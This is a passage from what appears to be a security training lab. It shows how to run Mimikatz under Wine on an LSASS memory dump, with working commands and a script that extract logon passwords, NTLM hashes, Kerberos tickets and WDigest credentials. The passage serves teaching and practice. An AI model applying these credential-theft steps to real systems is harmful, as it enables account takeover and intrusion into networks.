Task 2: Extract Credentials Using Mimikatz
Step 2.1: Set Up Mimikatz Environment
Prepare directories and verify Mimikatz installation:

# Navigate to tools directory
cd /opt/mimikatz-lab/tools

# Verify Mimikatz
ls -la mimikatz.exe

# Create output directory
mkdir -p /opt/mimikatz-lab/output
Step 2.2: Extract Logon Passwords
Use Mimikatz to extract credentials from the memory dump:

# Extract logon passwords
wine mimikatz.exe "sekurlsa::minidump /opt/mimikatz-lab/dumps/lsass.dmp" "sekurlsa::logonpasswords" "exit" > /opt/mimikatz-lab/output/logon_passwords.txt

# View extracted credentials
cat /opt/mimikatz-lab/output/logon_passwords.txt | grep -A 5 "Username"
Step 2.3: Extract Different Credential Types
Create a script to extract multiple credential types:

# Create extraction script
cat > /opt/mimikatz-lab/extract_all.sh << 'EOF'
#!/bin/bash

DUMP="/opt/mimikatz-lab/dumps/lsass.dmp"
OUT="/opt/mimikatz-lab/output"
MIMIKATZ="/opt/mimikatz-lab/tools/mimikatz.exe"

echo "Extracting credentials..."

# Extract NTLM hashes
wine $MIMIKATZ "sekurlsa::minidump $DUMP" "sekurlsa::msv" "exit" > "$OUT/ntlm_hashes.txt"

# Extract Kerberos tickets
wine $MIMIKATZ "sekurlsa::minidump $DUMP" "sekurlsa::tickets" "exit" > "$OUT/kerberos_tickets.txt"

# Extract WDigest credentials
wine $MIMIKATZ "sekurlsa::minidump $DUMP" "sekurlsa::wdigest" "exit" > "$OUT/wdigest_creds.txt"

echo "Extraction complete!"
EOF

# Make executable and run
chmod +x /opt/mimikatz-lab/extract_all.sh
./extract_all.sh
Step 2.4: Analyze Extracted Data
Review the extracted credentials:

